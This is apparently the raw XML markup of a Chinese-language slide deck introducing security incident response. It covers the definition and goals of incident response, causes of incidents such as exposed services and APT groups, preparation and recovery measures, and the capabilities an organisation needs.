                                        <p:cTn id="26" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2048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0485"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20485"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="32" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2048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up)">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P spid="20484" grpId="0"/>
      <p:bldP spid="20485" grpId="0"/>
      <p:bldP spid="20486" grpId="0"/>
      <p:bldP spid="20487"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23465F-2B4C-CE49-961D-587860E2B935}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584"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a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="21506" name="图片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552" y="1988840"/>
            <a:ext cx="3303389" cy="286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矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4283968" y="2132856"/>
            <a:ext cx="403244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600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应急响应 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Incident Response或Emergency Response”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>等，</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15586617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additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="21507"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="215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F9F848-AD31-E841-924C-CEE1CBB832C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="112474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导致安全事件的原因</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22530" name="矩形 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="870348" y="2128838"/>
            <a:ext cx="780610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marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>大型企业的业务模式多，对外暴露的服务也多。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>由于对外暴露的服务多，导致被攻击的面也会扩大。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>黑产团伙每天都会利用秒杀型漏洞批量扫描全网IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>除了黑产，还有可能会遇到APT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3483274675"/>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7DB383-8A72-6442-BAC2-D60957E6471B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560"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应急响应目标</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="24578"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916832"/>
            <a:ext cx="7992888" cy="388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7042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4578"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24578"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="245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FCADA7-49B4-6246-B47C-6C00EDAE0FE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="934819"/>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应急响应意义</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26626" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="323528" y="1772816"/>
            <a:ext cx="5429472"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600" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>应急响应的意义应该主要包括两个方面：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>第一、未雨绸缪</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>即在事件发生前事先做好准备，比如风险评估、制定安全计划、安全意识的培训、以发布安全通告的方式进行的预警、以及各种防范措施；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>第二、亡羊补牢，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>即在事件发生后采取的措施，其目的在于把事件造成的损失降到最小。这些行动措施可能来自于人，也可能来自系统，不如发现事件发生后，系统备份、病毒检测、后门检测、清除病毒或后门、隔离、系统恢复、调查与追踪、入侵者取证等一系列操作。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26627"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2120" y="1556792"/>
            <a:ext cx="3128963" cy="2131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23528" y="4455957"/>
            <a:ext cx="8352928" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>       以上两个方面的工作是相互补充的。首先，事前的计划和准备为事件发生后的响应动作提供了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>指导框架</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>，否则，响应动作将陷入混乱，而这些毫无章法的响应动作有可能造成比事件本身更大的损失；其次，事后的响应可能发现事前计划的不足，吸取教训，从而</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>进一步完善安全计划</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>。因此，这两个方面应该形成一种正反馈的机制，逐步强化组织的安全防范体系。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1963272072"/>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B5D4DA-066C-8E46-93ED-B4E9E97AEF27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520" y="75779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应急响应的能力要求</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27650" name="TextBox 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="381000" y="1396067"/>
            <a:ext cx="786340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600" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>        一个企业、组织的应急响应能力体现了该企业、组织在应对计算机安全事件过程中的预准备状态、水平和机构间协调能力，要求能够在不受事件控制的情况下驾驭事件。计算机安全事件响应能力建设应该包括：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27651" name="TextBox 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="381000" y="2528887"/>
            <a:ext cx="563116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建立计算机安全事件应急响应策略与规划；</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00000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>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确立计算机安全事件处置与报告流程；</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00000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>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制定与计算机安全事件处置相关的第三方协调的工作指南；</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00000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>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确定计算机安全事件应急响应的组织框架、工作小组构成及其服务能力要求；</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00000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>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为计算机安全事件应急响应工作组配置相应的人力、物力、财力资源；</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00000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>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建立计算机安全事件应急响应工作组与国家、行业相关组织的联络、报告和协调机制。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0066FF"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27652" name="图片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2160" y="3717032"/>
            <a:ext cx="3016052" cy="243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94373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650"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27650"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="276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651"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27651"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="276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27651"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C25069-3219-CA45-950B-84712CD25A24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560"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应急预案</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2969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700808"/>
            <a:ext cx="7848872" cy="4373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02763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barn(outVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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E34A7D-56CD-0F47-8273-E5442B68FC5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
